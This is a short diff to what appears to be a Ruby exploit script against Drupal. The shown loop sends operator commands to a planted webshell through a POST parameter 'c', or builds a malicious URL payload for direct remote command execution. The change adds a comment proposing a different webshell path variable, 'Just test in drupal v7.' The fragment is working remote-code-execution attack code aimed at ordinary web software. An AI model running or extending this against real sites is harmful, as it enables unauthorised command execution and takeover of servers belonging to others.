@@ -348,7 +348,8 @@ loop do
   if webshellpath
     # Send request
     result = http_request("#{$target}#{webshell}", "post", "c=#{command}").body
-  # Direct commands
+    # Here May be:result = http_request("#{$target}#{webshellpath}", "post", "c=#{command}").body(Just test in drupal v7.)
+    # Direct commands
   else
     url, payload = gen_evil_url(command, true)
     response = http_request(url, "post", payload)
